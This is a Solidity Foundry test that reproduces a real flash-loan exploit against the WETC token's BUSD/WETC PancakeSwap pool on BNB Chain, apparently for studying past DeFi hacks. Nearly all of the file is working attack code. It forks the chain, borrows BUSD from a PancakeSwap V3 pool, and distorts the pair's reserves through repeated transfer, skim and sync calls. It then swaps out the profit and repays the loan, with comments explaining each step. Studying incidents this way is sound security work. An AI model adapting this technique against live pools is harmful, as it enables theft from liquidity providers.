// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 101k USD
// Attacker : https://bscscan.com/address/0x7e7c1f0d567c0483f85e1d016718e44414cdbafe
// Attack Contract : https://bscscan.com/address/0x7e7c1f0d567c0483f85e1d016718e44414cdbafe
// Vulnerable Contract : https://bscscan.com/address/0xaf68efb3c1e81aad5cdb3d4962c8815fb754c688
// Attack Tx : https://bscscan.com/tx/0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xaf68efb3c1e81aad5cdb3d4962c8815fb754c688#code

// @Analysis
// Post-mortem : https://t.me/evmhacks/78?single
// Twitter Guy : N/A
// Hacking God : N/A


contract WETC is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 54333337;
    uint256 borrowAmount = 1000000000000000000000000;

    address constant busd_wetc_cakeLP = 0x8e2cc521b12dEBA9A20EdeA829c6493410dAD0E3;
    address constant pancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address constant wetc = 0xE7f12B72bfD6E83c237318b89512B418e7f6d7A7;
    address constant busd = 0x55d398326f99059fF775485246999027B3197955;
    address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of, Keep it address(0) if it's ETH
        fundingToken = address(busd);
    }

    function testExploit() public balanceLog {
        // The exploit begins by taking a large flash loan from a PancakeSwap V3 pool.
        IPancakeV3Pool(pancakeV3Pool).flash(address(this), borrowAmount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
      // The core of the exploit involves manipulating the reserves of the BUSD/WETC PancakeSwap V2 pool.
      // 1. A small initial swap is performed.
      IPancakePair(busd_wetc_cakeLP).swap(1000, 6994607918395778704138079, address(this), "0x00");

      // 2. Large amounts of WETC are directly transferred to the LP pair contract.
      // The `skim` function is then called. `skim` is designed to collect excess tokens sent to the pair contract.
      // By sending tokens and then calling skim, the attacker forces the pool's internal reserves out of sync with its actual token balances.
      IERC20(wetc).transfer(address(busd_wetc_cakeLP), 3533285263192068394666304);
      IPancakePair(busd_wetc_cakeLP).skim(0xB213171c9a803997B44842d0361e742e1E6691fc);
      // `sync` is called to update the reserves to the now-inflated token balances, distorting the price.
      IPancakePair(busd_wetc_cakeLP).sync();

      // This process is repeated to further manipulate the reserves.
      IERC20(wetc).transfer(address(busd_wetc_cakeLP), 27354466553745045636126);
      IPancakePair(busd_wetc_cakeLP).skim(0xB213171c9a803997B44842d0361e742e1E6691fc);
      IPancakePair(busd_wetc_cakeLP).sync();

      // 3. Small amounts of BUSD and more WETC are transferred in.
      IERC20(busd).transfer(address(busd_wetc_cakeLP), 10000);
      IERC20(wetc).transfer(address(busd_wetc_cakeLP), 3433968188649965263835649);
      
      // 4. With the price heavily manipulated, the attacker swaps the remaining assets for a large amount of BUSD.
      IPancakePair(busd_wetc_cakeLP).swap(351495403570120114936199, 0, address(this), "");

      // 5. The flash loan is repaid with the required fee. The remaining BUSD is the profit.
      uint256 repayAmount = borrowAmount + fee0;
      IERC20(busd).transfer(address(pancakeV3Pool), repayAmount);
    } 

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) public {
      // This function is called by the PancakeSwap pair during the first swap.
      // The attacker uses this callback to send the flash-loaned BUSD to the pair to cover the swap input.
      IERC20(busd).transfer(address(busd_wetc_cakeLP), 250000000000000000002000);
    }
}